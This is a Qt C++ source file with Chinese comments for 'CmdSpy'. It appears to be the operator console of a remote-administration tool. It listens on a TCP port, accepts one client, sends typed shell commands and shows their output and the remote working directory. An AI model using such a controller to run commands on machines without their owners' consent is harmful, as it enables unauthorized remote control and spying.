#include "cmdspy.h"

CmdSpy::CmdSpy(QWidget *parent) :
    QWidget(parent), mSock(0), mCmdRet(0)

{
    // 初始化窗口
    const int w = 800, h = 550;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);

    // 初始化编辑框
    mCmdRet = new QTextEdit(this);
    mCmdRet->setGeometry(0 , 0 , w, h-25);
    mCmdRet->setStyleSheet("QTextEdit {background: black; color: white;}");
    mCmdRet->setReadOnly(true);

    // 初始化话发送指令编辑框
    mCmdEdit= new QLineEdit(this);
    mCmdEdit->setGeometry(0 , h-mCmdRet->height() , w, 25);
    mCmdEdit->setStyleSheet("QLineEdit {background: blue; color: white;}");
    mCmdEdit->setFocus();
    connect(mCmdEdit, SIGNAL(textChanged(QString)), this, SLOT(textChanged()));
    connect(mCmdEdit, SIGNAL(returnPressed()), this, SLOT(newCommand()));
}

int CmdSpy::startCmdSpyServer(QString userName)
{
    // 设置窗口标题
    this->setWindowTitle(userName.append("-Cmd控制"));

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启Cmd控制服务端失败";
        deleteLater();
        return -1;
    }

    // 开启监控窗口
    this->show();

    return mServer->server()->serverPort();
}

void CmdSpy::sendCommand(QString cmd)
{
    if (mSock) {
        cmd.append(CmdEnd);
        mSock->write(cmd.toLocal8Bit());
    }
}

void CmdSpy::addRetValue(QString retValue)
{
    if (mCmdRet) {
        _curRet.append(retValue);
        mCmdRet->clear();
        mCmdRet->setText(_curRet);

        // 滚动到显示框底部
        QScrollBar *scrollbar = mCmdRet->verticalScrollBar();
        scrollbar->setSliderPosition(scrollbar->maximum());
    }
}

void CmdSpy::newConnection(QTcpSocket *s)
{
    // 新增客户
    mSock = new TcpSocket(s, this);
    connect(mSock, SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // 获取路径
    sendCommand("");

    // 不再监听新客户
    mServer->server()->close();
}

void CmdSpy::processBuffer()
{
    // 从socket里获取缓存区
    QByteArray *buf = mSock->buffer();

    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // 提取一行指令
        QByteArray retValue = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        if (retValue.mid(0, CmdPWD.size()) == CmdPWD) {
            // 处理当前位置
            retValue = retValue.mid(CmdPWD.size()+CmdSplit.size(),
                                    retValue.size()-CmdPWD.size()-CmdSplit.size());
            addRetValue("\r\n"+QString::fromLocal8Bit(retValue.append("> ")));
        } else {
            // 处理指令返回值
            addRetValue(QString::fromLocal8Bit(retValue) + "\r\n");
        }
    }
}

void CmdSpy::textChanged()
{
    // 更改显示框
    mCmdRet->setText(_curRet + mCmdEdit->text());

    // 滚动到显示框底部
    QScrollBar *scrollbar = mCmdRet->verticalScrollBar();
    scrollbar->setSliderPosition(scrollbar->maximum());
}

void CmdSpy::newCommand()
{
    QString cmd = mCmdEdit->text();

    // 更改显示框
    addRetValue(cmd+"\r\n");

    // 发送指令
    sendCommand(cmd);

    // 清空编辑框
    mCmdEdit->setText("");

    // 如果cmd等于clear，就清空显示框
    if (cmd.toUpper() == "CLEAR") {
        mCmdRet->clear();
        _curRet = "";
    }
}

void CmdSpy::resizeEvent(QResizeEvent *)
{
    if (mCmdRet && mCmdEdit) {
        mCmdRet->setGeometry(0,0,width(),height() - 25);
        mCmdEdit->setGeometry(0 , height() - 25 , width(), 25);
    }
}

void CmdSpy::closeEvent(QCloseEvent *)
{
    deleteLater();
}
